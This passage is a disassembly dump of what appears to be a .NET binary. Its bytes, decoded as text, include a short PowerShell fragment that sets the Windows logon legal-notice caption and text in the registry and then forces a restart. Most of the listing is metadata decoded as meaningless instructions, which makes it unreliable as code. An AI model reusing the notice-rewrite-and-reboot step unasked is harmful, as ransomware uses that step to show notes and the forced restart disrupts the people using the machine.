  405635:	6e                   	outsb  %ds:(%esi),(%dx)
  405636:	65 20 3b             	and    %bh,%gs:(%ebx)
  405639:	33 22                	xor    (%edx),%esp
  40563b:	0d 0a 0d 0a 53       	or     $0x530a0d0a,%eax
  405640:	65 74 2d             	gs je  0x405670
  405643:	49                   	dec    %ecx
  405644:	74 65                	je     0x4056ab
  405646:	6d                   	insl   (%dx),%es:(%edi)
  405647:	50                   	push   %eax
  405648:	72 6f                	jb     0x4056b9
  40564a:	70 65                	jo     0x4056b1
  40564c:	72 74                	jb     0x4056c2
  40564e:	79 20                	jns    0x405670
  405650:	2d 50 61 74 68       	sub    $0x68746150,%eax
  405655:	20 24 52             	and    %ah,(%edx,%edx,2)
  405658:	65 67 50             	gs addr16 push %eax
  40565b:	61                   	popa
  40565c:	74 68                	je     0x4056c6
  40565e:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  405664:	20 22                	and    %ah,(%edx)
  405666:	6c                   	insb   (%dx),%es:(%edi)
  405667:	65 67 61             	gs addr16 popa
  40566a:	6c                   	insb   (%dx),%es:(%edi)
  40566b:	6e                   	outsb  %ds:(%esi),(%dx)
  40566c:	6f                   	outsl  %ds:(%esi),(%dx)
  40566d:	74 69                	je     0x4056d8
  40566f:	63 65 63             	arpl   %esp,0x63(%ebp)
  405672:	61                   	popa
  405673:	70 74                	jo     0x4056e9
  405675:	69 6f 6e 22 20 2d 56 	imul   $0x562d2022,0x6e(%edi),%ebp
  40567c:	61                   	popa
  40567d:	6c                   	insb   (%dx),%es:(%edi)
  40567e:	75 65                	jne    0x4056e5
  405680:	20 24 4c             	and    %ah,(%esp,%ecx,2)
  405683:	65 67 61             	gs addr16 popa
  405686:	6c                   	insb   (%dx),%es:(%edi)
  405687:	43                   	inc    %ebx
  405688:	61                   	popa
  405689:	70 74                	jo     0x4056ff
  40568b:	69 6f 6e 20 2d 46 6f 	imul   $0x6f462d20,0x6e(%edi),%ebp
  405692:	72 63                	jb     0x4056f7
  405694:	65 0d 0a 53 65 74    	gs or  $0x7465530a,%eax
  40569a:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  40569f:	50                   	push   %eax
  4056a0:	72 6f                	jb     0x405711
  4056a2:	70 65                	jo     0x405709
  4056a4:	72 74                	jb     0x40571a
  4056a6:	79 20                	jns    0x4056c8
  4056a8:	2d 50 61 74 68       	sub    $0x68746150,%eax
  4056ad:	20 24 52             	and    %ah,(%edx,%edx,2)
  4056b0:	65 67 50             	gs addr16 push %eax
  4056b3:	61                   	popa
  4056b4:	74 68                	je     0x40571e
  4056b6:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  4056bc:	20 22                	and    %ah,(%edx)
  4056be:	6c                   	insb   (%dx),%es:(%edi)
  4056bf:	65 67 61             	gs addr16 popa
  4056c2:	6c                   	insb   (%dx),%es:(%edi)
  4056c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4056c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4056c5:	74 69                	je     0x405730
  4056c7:	63 65 74             	arpl   %esp,0x74(%ebp)
  4056ca:	65 78 74             	gs js  0x405741
  4056cd:	22 20                	and    (%eax),%ah
  4056cf:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  4056d4:	65 20 24 4c          	and    %ah,%gs:(%esp,%ecx,2)
  4056d8:	65 67 61             	gs addr16 popa
  4056db:	6c                   	insb   (%dx),%es:(%edi)
  4056dc:	54                   	push   %esp
  4056dd:	65 78 74             	gs js  0x405754
  4056e0:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  4056e6:	65 0d 0a 0d 0a 0d    	gs or  $0xd0a0d0a,%eax
  4056ec:	0a 52 65             	or     0x65(%edx),%dl
  4056ef:	73 74                	jae    0x405765
  4056f1:	61                   	popa
  4056f2:	72 74                	jb     0x405768
  4056f4:	2d 43 6f 6d 70       	sub    $0x706d6f43,%eax
  4056f9:	75 74                	jne    0x40576f
  4056fb:	65 72 00             	gs jb  0x4056fe
  4056fe:	00 00                	add    %al,(%eax)
  405700:	42                   	inc    %edx
  405701:	53                   	push   %ebx
  405702:	4a                   	dec    %edx
  405703:	42                   	inc    %edx
  405704:	01 00                	add    %eax,(%eax)
  405706:	01 00                	add    %eax,(%eax)
  405708:	00 00                	add    %al,(%eax)
  40570a:	00 00                	add    %al,(%eax)
  40570c:	0c 00                	or     $0x0,%al
  40570e:	00 00                	add    %al,(%eax)
  405710:	76 34                	jbe    0x405746
  405712:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405715:	33 30                	xor    (%eax),%esi
  405717:	33 31                	xor    (%ecx),%esi
  405719:	39 00                	cmp    %eax,(%eax)
  40571b:	00 00                	add    %al,(%eax)
  40571d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405723:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  405726:	00 00                	add    %al,(%eax)
  405728:	23 7e 00             	and    0x0(%esi),%edi
  40572b:	00 88 1c 00 00 88    	add    %cl,-0x77ffffe4(%eax)
  405731:	22 00                	and    (%eax),%al
  405733:	00 23                	add    %ah,(%ebx)
  405735:	53                   	push   %ebx
  405736:	74 72                	je     0x4057aa
  405738:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  40573f:	00 10                	add    %dl,(%eax)
  405741:	3f                   	aas
  405742:	00 00                	add    %al,(%eax)
  405744:	9c                   	pushf
  405745:	04 00                	add    $0x0,%al
  405747:	00 23                	add    %ah,(%ebx)
  405749:	55                   	push   %ebp
  40574a:	53                   	push   %ebx
  40574b:	00 ac 43 00 00 10 00 	add    %ch,0x100000(%ebx,%eax,2)
  405752:	00 00                	add    %al,(%eax)
  405754:	23 47 55             	and    0x55(%edi),%eax
  405757:	49                   	dec    %ecx
  405758:	44                   	inc    %esp
  405759:	00 00                	add    %al,(%eax)
  40575b:	00 bc 43 00 00 30 08 	add    %bh,0x8300000(%ebx,%eax,2)
  405762:	00 00                	add    %al,(%eax)
  405764:	23 42 6c             	and    0x6c(%edx),%eax
  405767:	6f                   	outsl  %ds:(%esi),(%dx)
  405768:	62 00                	bound  %eax,(%eax)
  40576a:	00 00                	add    %al,(%eax)
  40576c:	00 00                	add    %al,(%eax)
  40576e:	00 00                	add    %al,(%eax)
  405770:	02 00                	add    (%eax),%al
  405772:	00 01                	add    %al,(%ecx)
  405774:	57                   	push   %edi
  405775:	3f                   	aas
  405776:	a2 1d 09 0b 00       	mov    %al,0xb091d
  40577b:	00 00                	add    %al,(%eax)
  40577d:	fa                   	cli
  40577e:	25 33 00 16 00       	and    $0x160033,%eax
  405783:	00 01                	add    %al,(%ecx)
  405785:	00 00                	add    %al,(%eax)
  405787:	00 93 00 00 00 16    	add    %dl,0x16000000(%ebx)
  40578d:	00 00                	add    %al,(%eax)
  40578f:	00 59 00             	add    %bl,0x0(%ecx)
  405792:	00 00                	add    %al,(%eax)
  405794:	7d 00                	jge    0x405796
  405796:	00 00                	add    %al,(%eax)
  405798:	80 00 00             	addb   $0x0,(%eax)
  40579b:	00 01                	add    %al,(%ecx)
  40579d:	00 00                	add    %al,(%eax)
  40579f:	00 1d 01 00 00 21    	add    %bl,0x21000001
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 0b                	add    %cl,(%ebx)
  4057a9:	00 00                	add    %al,(%eax)
  4057ab:	00 02                	add    %al,(%edx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 13                	add    %dl,(%ebx)
  4057b1:	00 00                	add    %al,(%eax)
  4057b3:	00 06                	add    %al,(%esi)
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 21                	add    %ah,(%ecx)
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 37                	add    %dh,(%edi)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 03                	add    %al,(%ebx)
  4057c1:	00 00                	add    %al,(%eax)
  4057c3:	00 0b                	add    %cl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 05 00 00 00 01    	add    %al,0x1000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 05 00 00 00 01    	add    %al,0x1000000
  4057d5:	00 00                	add    %al,(%eax)
  4057d7:	00 0a                	add    %cl,(%edx)
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 02                	add    %al,(%edx)
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 00                	add    %al,(%eax)
  4057e1:	00 0a                	add    %cl,(%edx)
  4057e3:	00 01                	add    %al,(%ecx)
  4057e5:	00 00                	add    %al,(%eax)
  4057e7:	00 00                	add    %al,(%eax)
  4057e9:	00 06                	add    %al,(%esi)
  4057eb:	00 42 01             	add    %al,0x1(%edx)
  4057ee:	3b 01                	cmp    (%ecx),%eax
  4057f0:	06                   	push   %es
  4057f1:	00 49 01             	add    %cl,0x1(%ecx)
  4057f4:	3b 01                	cmp    (%ecx),%eax
  4057f6:	06                   	push   %es
  4057f7:	00 53 01             	add    %dl,0x1(%ebx)
  4057fa:	3b 01                	cmp    (%ecx),%eax
  4057fc:	0a 00                	or     (%eax),%al
  4057fe:	97                   	xchg   %eax,%edi
  4057ff:	01 75 01             	add    %esi,0x1(%ebp)
  405802:	0e                   	push   %cs
  405803:	00 c3                	add    %al,%bl
  405805:	01 ae 01 0a 00 c8    	add    %ebp,-0x37fff5ff(%esi)
  40580b:	01 75 01             	add    %esi,0x1(%ebp)
  40580e:	0a 00                	or     (%eax),%al
  405810:	dc 01                	faddl  (%ecx)
  405812:	75 01                	jne    0x405815
  405814:	06                   	push   %es
  405815:	00 ef                	add    %ch,%bh
  405817:	01 e3                	add    %esp,%ebx
  405819:	01 0a                	add    %ecx,(%edx)
  40581b:	00 18                	add    %bl,(%eax)
  40581d:	02 58 01             	add    0x1(%eax),%bl
  405820:	0a 00                	or     (%eax),%al
  405822:	2a 02                	sub    (%edx),%al
  405824:	58                   	pop    %eax
  405825:	01 06                	add    %eax,(%esi)
  405827:	00 8c 04 3b 01 0a 00 	add    %cl,0xa013b(%esp,%eax,1)
  40582e:	e7 04                	out    %eax,$0x4
  405830:	75 01                	jne    0x405833
  405832:	0a 00                	or     (%eax),%al
  405834:	0a 05 75 01 0a 00    	or     0xa0175,%al
  40583a:	a2 05 75 01 0a       	mov    %al,0xa017505
  40583f:	00 ad 05 75 01 0a    	add    %ch,0xa017505(%ebp)
  405845:	00 06                	add    %al,(%esi)
  405847:	06                   	push   %es
  405848:	75 01                	jne    0x40584b
  40584a:	0a 00                	or     (%eax),%al
  40584c:	0e                   	push   %cs
  40584d:	06                   	push   %es
  40584e:	75 01                	jne    0x405851
  405850:	0e                   	push   %cs
  405851:	00 59 07             	add    %bl,0x7(%ecx)
  405854:	ae                   	scas   %es:(%edi),%al
  405855:	01 06                	add    %eax,(%esi)
  405857:	00 8a 07 6b 07 0a    	add    %cl,0xa076b07(%edx)
  40585d:	00 97 07 75 01 0e    	add    %dl,0xe017507(%edi)
  405863:	00 b3 07 ae 01 0e    	add    %dh,0xe01ae07(%ebx)
  405869:	00 dd                	add    %bl,%ch
  40586b:	07                   	pop    %es
  40586c:	ae                   	scas   %es:(%edi),%al
  40586d:	01 12                	add    %edx,(%edx)
  40586f:	00 33                	add    %dh,(%ebx)
  405871:	08 25 08 06 00 74    	or     %ah,0x74000608
  405877:	08 59 08             	or     %bl,0x8(%ecx)
  40587a:	16                   	push   %ss
  40587b:	00 9b 08 8c 08 12    	add    %bl,0x12088c08(%ebx)
  405881:	00 c2                	add    %al,%dl
  405883:	08 25 08 0a 00 ec    	or     %ah,0xec000a08
  405889:	08 58 01             	or     %bl,0x1(%eax)
  40588c:	0e                   	push   %cs
  40588d:	00 02                	add    %al,(%edx)
  40588f:	09 ae 01 0e 00 1c    	or     %ebp,0x1c000e01(%esi)
  405895:	09 ae 01 06 00 2f    	or     %ebp,0x2f000601(%esi)
  40589b:	0b 59 08             	or     0x8(%ecx),%ebx
  40589e:	0a 00                	or     (%eax),%al
  4058a0:	3c 0b                	cmp    $0xb,%al
  4058a2:	58                   	pop    %eax
  4058a3:	01 0a                	add    %ecx,(%edx)
  4058a5:	00 45 0b             	add    %al,0xb(%ebp)
  4058a8:	75 01                	jne    0x4058ab
  4058aa:	0a 00                	or     (%eax),%al
  4058ac:	6d                   	insl   (%dx),%es:(%edi)
  4058ad:	0b 58 01             	or     0x1(%eax),%ebx
  4058b0:	06                   	push   %es
  4058b1:	00 c7                	add    %al,%bh
  4058b3:	0b b7 0b 06 00 7d    	or     0x7d00060b(%edi),%esi
  4058b9:	0c 68                	or     $0x68,%al
  4058bb:	0c 06                	or     $0x6,%al
  4058bd:	00 b3 0c 3b 01 06    	add    %dh,0x6013b0c(%ebx)
  4058c3:	00 27                	add    %ah,(%edi)
  4058c5:	0d 3b 01 06 00       	or     $0x6013b,%eax
  4058ca:	50                   	push   %eax
  4058cb:	10 3b                	adc    %bh,(%ebx)
  4058cd:	01 06                	add    %eax,(%esi)
  4058cf:	00 02                	add    %al,(%edx)
  4058d1:	11 e3                	adc    %esp,%ebx
  4058d3:	10 06                	adc    %al,(%esi)
  4058d5:	00 15 11 e3 10 06    	add    %dl,0x610e311
  4058db:	00 f9                	add    %bh,%cl
  4058dd:	11 e3                	adc    %esp,%ebx
  4058df:	10 06                	adc    %al,(%esi)
  4058e1:	00 fe                	add    %bh,%dh
  4058e3:	12 ec                	adc    %ah,%ch
  4058e5:	12 06                	adc    (%esi),%al
  4058e7:	00 15 13 ec 12 06    	add    %dl,0x612ec13
  4058ed:	00 2e                	add    %ch,(%esi)
  4058ef:	13 ec                	adc    %esp,%ebp
  4058f1:	12 06                	adc    (%esi),%al
  4058f3:	00 49 13             	add    %cl,0x13(%ecx)
  4058f6:	ec                   	in     (%dx),%al
  4058f7:	12 06                	adc    (%esi),%al
  4058f9:	00 64 13 ec          	add    %ah,-0x14(%ebx,%edx,1)
  4058fd:	12 06                	adc    (%esi),%al
  4058ff:	00 81 13 ec 12 06    	add    %al,0x612ec13(%ecx)
  405905:	00 ba 13 9a 13 06    	add    %bh,0x6139a13(%edx)
  40590b:	00 da                	add    %bl,%dl
  40590d:	13 9a 13 06 00 09    	adc    0x9000613(%edx),%ebx
  405913:	14 e3                	adc    $0xe3,%al
  405915:	10 06                	adc    %al,(%esi)
  405917:	00 23                	add    %ah,(%ebx)
  405919:	14 3b                	adc    $0x3b,%al
  40591b:	01 06                	add    %eax,(%esi)
  40591d:	00 38                	add    %bh,(%eax)
  40591f:	14 e3                	adc    $0xe3,%al
  405921:	10 06                	adc    %al,(%esi)
  405923:	00 47 14             	add    %al,0x14(%edi)
  405926:	3b 01                	cmp    (%ecx),%eax
  405928:	06                   	push   %es
  405929:	00 5c 14 e3          	add    %bl,-0x1d(%esp,%edx,1)
  40592d:	10 06                	adc    %al,(%esi)
  40592f:	00 72 14             	add    %dh,0x14(%edx)
  405932:	e3 10                	jecxz  0x405944
  405934:	06                   	push   %es
  405935:	00 7d 14             	add    %bh,0x14(%ebp)
  405938:	3b 01                	cmp    (%ecx),%eax
  40593a:	0e                   	push   %cs
  40593b:	00 b6 14 ae 01 0a    	add    %dh,0xa01ae14(%esi)
  405941:	00 f8                	add    %bh,%al
  405943:	14 75                	adc    $0x75,%al
  405945:	01 06                	add    %eax,(%esi)
  405947:	00 28                	add    %ch,(%eax)
  405949:	15 3b 01 16 00       	adc    $0x16013b,%eax
  40594e:	60                   	pusha
  40594f:	15 8c 08 0e 00       	adc    $0xe088c,%eax
  405954:	66 15 ae 01          	adc    $0x1ae,%ax
  405958:	0e                   	push   %cs
  405959:	00 8f 15 ae 01 0e    	add    %cl,0xe01ae15(%edi)
  40595f:	00 af 15 ae 01 0e    	add    %ch,0xe01ae15(%edi)
  405965:	00 b7 15 ae 01 16    	add    %dh,0x1601ae15(%edi)
  40596b:	00 c7                	add    %al,%bh
  40596d:	15 8c 08 0e 00       	adc    $0xe088c,%eax
  405972:	da 15 ae 01 16 00    	ficoml 0x1601ae
  405978:	ad                   	lods   %ds:(%esi),%eax
  405979:	05 8c 08 16 00       	add    $0x16088c,%eax
  40597e:	e7 04                	out    %eax,$0x4
  405980:	8c 08                	mov    %cs,(%eax)
  405982:	e7 00                	out    %eax,$0x0
  405984:	1f                   	pop    %ds
  405985:	16                   	push   %ss
  405986:	00 00                	add    %al,(%eax)
  405988:	06                   	push   %es
  405989:	00 86 16 3b 01 0e    	add    %al,0xe013b16(%esi)
  40598f:	00 a7 16 ae 01 0e    	add    %ah,0xe01ae16(%edi)
  405995:	00 cb                	add    %cl,%bl
  405997:	16                   	push   %ss
  405998:	ae                   	scas   %es:(%edi),%al
  405999:	01 06                	add    %eax,(%esi)
  40599b:	00 ef                	add    %ch,%bh
  40599d:	16                   	push   %ss
  40599e:	ec                   	in     (%dx),%al
  40599f:	12 16                	adc    (%esi),%dl
  4059a1:	00 1a                	add    %bl,(%edx)
  4059a3:	17                   	pop    %ss
  4059a4:	8c 08                	mov    %cs,(%eax)
  4059a6:	0e                   	push   %cs
  4059a7:	00 5e 17             	add    %bl,0x17(%esi)
  4059aa:	ae                   	scas   %es:(%edi),%al
  4059ab:	01 0e                	add    %ecx,(%esi)
  4059ad:	00 ad 17 ae 01 0e    	add    %ch,0xe01ae17(%ebp)
  4059b3:	00 b9 17 ae 01 06    	add    %bh,0x601ae17(%ecx)
  4059b9:	00 c1                	add    %al,%cl
  4059bb:	17                   	pop    %ss
  4059bc:	59                   	pop    %ecx
  4059bd:	08 06                	or     %al,(%esi)
  4059bf:	00 38                	add    %bh,(%eax)
  4059c1:	18 25 18 06 00 4d    	sbb    %ah,0x4d000618
  4059c7:	18 3b                	sbb    %bh,(%ebx)
  4059c9:	01 06                	add    %eax,(%esi)
  4059cb:	00 7c 18 3b          	add    %bh,0x3b(%eax,%ebx,1)
  4059cf:	01 0e                	add    %ecx,(%esi)
  4059d1:	00 81 18 ae 01 0a    	add    %al,0xa01ae18(%ecx)
  4059d7:	00 15 19 75 01 16    	add    %dl,0x16017519
  4059dd:	00 78 19             	add    %bh,0x19(%eax)
  4059e0:	8c 08                	mov    %cs,(%eax)
  4059e2:	0e                   	push   %cs
  4059e3:	00 c8                	add    %cl,%al
  4059e5:	19 ae 01 12 00 13    	sbb    %ebp,0x13001201(%esi)
  4059eb:	1a 25 08 16 00 80    	sbb    0x80001608,%ah
  4059f1:	1a 8c 08 16 00 8e 1a 	sbb    0x1a8e0016(%eax,%ecx,1),%cl
  4059f8:	8c 08                	mov    %cs,(%eax)
  4059fa:	0e                   	push   %cs
  4059fb:	00 a1 1a ae 01 0a    	add    %ah,0xa01ae1a(%ecx)
  405a01:	00 e2                	add    %ah,%dl
  405a03:	1a 58 01             	sbb    0x1(%eax),%bl
  405a06:	12 00                	adc    (%eax),%al
  405a08:	21 1b                	and    %ebx,(%ebx)
  405a0a:	0b 1b                	or     (%ebx),%ebx
  405a0c:	06                   	push   %es
  405a0d:	00 a1 1b 3b 01 06    	add    %ah,0x6013b1b(%ecx)
  405a13:	00 b9 1b 3b 01 0e    	add    %bh,0xe013b1b(%ecx)
  405a19:	00 fa                	add    %bh,%dl
  405a1b:	1b ae 01 0e 00 1c    	sbb    0x1c000e01(%esi),%ebp
  405a21:	1c ae                	sbb    $0xae,%al
  405a23:	01 06                	add    %eax,(%esi)
  405a25:	00 45 1c             	add    %al,0x1c(%ebp)
  405a28:	3b 01                	cmp    (%ecx),%eax
  405a2a:	06                   	push   %es
  405a2b:	00 4a 1c             	add    %cl,0x1c(%edx)
  405a2e:	3b 01                	cmp    (%ecx),%eax
  405a30:	06                   	push   %es
  405a31:	00 91 1c 3b 01 06    	add    %dl,0x6013b1c(%ecx)
  405a37:	00 b1 1c ec 12 06    	add    %dh,0x612ec1c(%ecx)
  405a3d:	00 c1                	add    %al,%cl
  405a3f:	1c ec                	sbb    $0xec,%al
  405a41:	12 06                	adc    (%esi),%al
  405a43:	00 ce                	add    %cl,%dh
  405a45:	1c ec                	sbb    $0xec,%al
  405a47:	12 06                	adc    (%esi),%al
  405a49:	00 d5                	add    %dl,%ch
  405a4b:	1c ec                	sbb    $0xec,%al
  405a4d:	12 06                	adc    (%esi),%al
  405a4f:	00 fd                	add    %bh,%ch
  405a51:	1c 3b                	sbb    $0x3b,%al
  405a53:	01 06                	add    %eax,(%esi)
  405a55:	00 1d 1d 3b 01 06    	add    %bl,0x6013b1d
  405a5b:	00 4e 1d             	add    %cl,0x1d(%esi)
  405a5e:	3b 01                	cmp    (%ecx),%eax
  405a60:	06                   	push   %es
  405a61:	00 6f 1d             	add    %ch,0x1d(%edi)
  405a64:	3b 01                	cmp    (%ecx),%eax
  405a66:	06                   	push   %es
  405a67:	00 77 1d             	add    %dh,0x1d(%edi)
  405a6a:	3b 01                	cmp    (%ecx),%eax
  405a6c:	06                   	push   %es
  405a6d:	00 86 1d 3b 01 06    	add    %al,0x6013b1d(%esi)
  405a73:	00 c1                	add    %al,%cl
  405a75:	1d b0 1d 06 00       	sbb    $0x61db0,%eax
  405a7a:	ed                   	in     (%dx),%eax
  405a7b:	1d 3b 01 06 00       	sbb    $0x6013b,%eax
  405a80:	03 1e                	add    (%esi),%ebx
  405a82:	3b 01                	cmp    (%ecx),%eax
  405a84:	06                   	push   %es
  405a85:	00 29                	add    %ch,(%ecx)
  405a87:	1e                   	push   %ds
  405a88:	b0 1d                	mov    $0x1d,%al
  405a8a:	0a 00                	or     (%eax),%al
  405a8c:	3e 1e                	ds push %ds
  405a8e:	58                   	pop    %eax
  405a8f:	01 06                	add    %eax,(%esi)
  405a91:	00 67 1e             	add    %ah,0x1e(%edi)
  405a94:	3b 01                	cmp    (%ecx),%eax
  405a96:	0a 00                	or     (%eax),%al
  405a98:	82 1e 58             	sbbb   $0x58,(%esi)
  405a9b:	01 0a                	add    %ecx,(%edx)
  405a9d:	00 95 1e 58 01 06    	add    %dl,0x601581e(%ebp)
  405aa3:	00 d5                	add    %dl,%ch
  405aa5:	1e                   	push   %ds
  405aa6:	b0 1d                	mov    $0x1d,%al
  405aa8:	06                   	push   %es
  405aa9:	00 fc                	add    %bh,%ah
  405aab:	1e                   	push   %ds
  405aac:	3b 01                	cmp    (%ecx),%eax
  405aae:	0a 00                	or     (%eax),%al
  405ab0:	59                   	pop    %ecx
  405ab1:	1f                   	pop    %ds
  405ab2:	32 1f                	xor    (%edi),%bl
  405ab4:	0a 00                	or     (%eax),%al
  405ab6:	69 1f 32 1f 06 00    	imul   $0x61f32,(%edi),%ebx
  405abc:	81 1f b0 1d 0a 00    	sbbl   $0xa1db0,(%edi)
  405ac2:	a8 1f                	test   $0x1f,%al
  405ac4:	58                   	pop    %eax
  405ac5:	01 0a                	add    %ecx,(%edx)
  405ac7:	00 c7                	add    %al,%bh
  405ac9:	1f                   	pop    %ds
  405aca:	58                   	pop    %eax
  405acb:	01 06                	add    %eax,(%esi)
  405acd:	00 eb                	add    %ch,%bl
  405acf:	1f                   	pop    %ds
  405ad0:	3b 01                	cmp    (%ecx),%eax
  405ad2:	06                   	push   %es
  405ad3:	00 19                	add    %bl,(%ecx)
  405ad5:	20 3b                	and    %bh,(%ebx)
  405ad7:	01 06                	add    %eax,(%esi)
  405ad9:	00 35 20 3b 01 0e    	add    %dh,0xe013b20
  405adf:	00 4e 20             	add    %cl,0x20(%esi)
  405ae2:	ae                   	scas   %es:(%edi),%al
  405ae3:	01 0e                	add    %ecx,(%esi)
  405ae5:	00 60 20             	add    %ah,0x20(%eax)
  405ae8:	ae                   	scas   %es:(%edi),%al
  405ae9:	01 06                	add    %eax,(%esi)
  405aeb:	00 87 20 74 20 06    	add    %al,0x6207420(%edi)
  405af1:	00 a1 20 97 20 06    	add    %ah,0x6209720(%ecx)
  405af7:	00 c2                	add    %al,%dl
  405af9:	20 e3                	and    %ah,%bl
  405afb:	01 06                	add    %eax,(%esi)
  405afd:	00 d4                	add    %dl,%ah
  405aff:	20 97 20 06 00 e1    	and    %dl,-0x1efff9e0(%edi)
  405b05:	20 97 20 06 00 f6    	and    %dl,-0x9fff9e0(%edi)
  405b0b:	20 97 20 12 00 31    	and    %dl,0x31001220(%edi)
  405b11:	21 12                	and    %edx,(%edx)
  405b13:	21 12                	and    %edx,(%edx)
  405b15:	00 37                	add    %dh,(%edi)
  405b17:	21 12                	and    %edx,(%edx)
  405b19:	21 12                	and    %edx,(%edx)
  405b1b:	00 3d 21 12 21 12    	add    %bh,0x12211221
  405b21:	00 4f 21             	add    %cl,0x21(%edi)
  405b24:	12 21                	adc    (%ecx),%ah
  405b26:	06                   	push   %es
  405b27:	00 6a 21             	add    %ch,0x21(%edx)
  405b2a:	3b 01                	cmp    (%ecx),%eax
  405b2c:	12 00                	adc    (%eax),%al
  405b2e:	87 21                	xchg   %esp,(%ecx)
  405b30:	12 21                	adc    (%ecx),%ah
  405b32:	06                   	push   %es
  405b33:	00 a1 21 3b 01 06    	add    %ah,0x6013b21(%ecx)
  405b39:	00 c0                	add    %al,%al
  405b3b:	21 3b                	and    %edi,(%ebx)
  405b3d:	01 0a                	add    %ecx,(%edx)
  405b3f:	00 ce                	add    %cl,%dh
  405b41:	21 58 01             	and    %ebx,0x1(%eax)
  405b44:	06                   	push   %es
  405b45:	00 ef                	add    %ch,%bh
  405b47:	21 b0 1d 0a 00 02    	and    %esi,0x2000a1d(%eax)
  405b4d:	22 58 01             	and    0x1(%eax),%bl
  405b50:	0a 00                	or     (%eax),%al
  405b52:	30 22                	xor    %ah,(%edx)
  405b54:	58                   	pop    %eax
  405b55:	01 06                	add    %eax,(%esi)
  405b57:	00 57 22             	add    %dl,0x22(%edi)
  405b5a:	9a 13 00 00 00 00 01 	lcall  $0x100,$0x13
  405b61:	00 00                	add    %al,(%eax)
  405b63:	00 00                	add    %al,(%eax)
  405b65:	00 01                	add    %al,(%ecx)
  405b67:	00 01                	add    %al,(%ecx)
  405b69:	00 00                	add    %al,(%eax)
  405b6b:	00 10                	add    %dl,(%eax)
  405b6d:	00 1f                	add    %bl,(%edi)
  405b6f:	00 2f                	add    %ch,(%edi)
  405b71:	00 05 00 01 00 01    	add    %al,0x1000100
  405b77:	00 0b                	add    %cl,(%ebx)
  405b79:	01 11                	add    %edx,(%ecx)
  405b7b:	00 3f                	add    %bh,(%edi)
  405b7d:	00 00                	add    %al,(%eax)
  405b7f:	00 09                	add    %cl,(%ecx)
  405b81:	00 01                	add    %al,(%ecx)
  405b83:	00 04 00             	add    %al,(%eax,%eax,1)
  405b86:	03 01                	add    (%ecx),%eax
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	4b                   	dec    %ebx
  405b8b:	00 00                	add    %al,(%eax)
  405b8d:	00 0d 00 06 00 04    	add    %cl,0x4000600
  405b93:	00 02                	add    %al,(%edx)
  405b95:	01 00                	add    %eax,(%eax)
  405b97:	00 58 00             	add    %bl,0x0(%eax)
  405b9a:	00 00                	add    %al,(%eax)
  405b9c:	0d 00 18 00 04       	or     $0x4001800,%eax
  405ba1:	00 02                	add    %al,(%edx)
  405ba3:	00 10                	add    %dl,(%eax)
  405ba5:	00 6b 00             	add    %ch,0x0(%ebx)
  405ba8:	00 00                	add    %al,(%eax)
  405baa:	05 00 21 00 04       	add    $0x4002100,%eax
  405baf:	00 00                	add    %al,(%eax)
  405bb1:	00 10                	add    %dl,(%eax)
  405bb3:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  405bb7:	00 11                	add    %dl,(%ecx)
  405bb9:	00 24 00             	add    %ah,(%eax,%eax,1)
  405bbc:	05 00 01 00 10       	add    $0x10000100,%eax
  405bc1:	00 84 00 2f 00 05 00 	add    %al,0x5002f(%eax,%eax,1)
  405bc8:	27                   	daa
  405bc9:	00 1f                	add    %bl,(%edi)
  405bcb:	00 01                	add    %al,(%ecx)
  405bcd:	00 10                	add    %dl,(%eax)
  405bcf:	00 8e 00 2f 00 05    	add    %cl,0x5002f00(%esi)
  405bd5:	00 27                	add    %ah,(%edi)
  405bd7:	00 23                	add    %ah,(%ebx)
  405bd9:	00 01                	add    %al,(%ecx)
  405bdb:	00 10                	add    %dl,(%eax)
  405bdd:	00 99 00 2f 00 05    	add    %bl,0x5002f00(%ecx)
  405be3:	00 27                	add    %ah,(%edi)
  405be5:	00 25 00 03 00 10    	add    %ah,0x10000300
  405beb:	00 a5 00 00 00 15    	add    %ah,0x15000000(%ebp)
  405bf1:	00 27                	add    %ah,(%edi)
  405bf3:	00 29                	add    %ch,(%ecx)
  405bf5:	00 01                	add    %al,(%ecx)
  405bf7:	00 10                	add    %dl,(%eax)
  405bf9:	00 b3 00 2f 00 15    	add    %dh,0x15002f00(%ebx)
  405bff:	00 29                	add    %ch,(%ecx)
  405c01:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405c04:	0b 01                	or     (%ecx),%eax
  405c06:	10 00                	adc    %al,(%eax)
  405c08:	c1 00 00             	roll   $0x0,(%eax)
  405c0b:	00 09                	add    %cl,(%ecx)
  405c0d:	00 2f                	add    %ch,(%edi)
  405c0f:	00 34 00             	add    %dh,(%eax,%eax,1)
  405c12:	01 00                	add    %eax,(%eax)
  405c14:	10 00                	adc    %al,(%eax)
  405c16:	cf                   	iret
  405c17:	00 2f                	add    %ch,(%edi)
  405c19:	00 05 00 37 00 34    	add    %al,0x34003700
  405c1f:	00 03                	add    %al,(%ebx)
  405c21:	01 00                	add    %eax,(%eax)
  405c23:	00 dc                	add    %bl,%ah
  405c25:	00 00                	add    %al,(%eax)
  405c27:	00 0d 00 37 00 3a    	add    %cl,0x3a003700
  405c2d:	00 03                	add    %al,(%ebx)
  405c2f:	01 00                	add    %eax,(%eax)
  405c31:	00 e5                	add    %ah,%ch
  405c33:	00 00                	add    %al,(%eax)
  405c35:	00 0d 00 3d 00 3a    	add    %cl,0x3a003d00
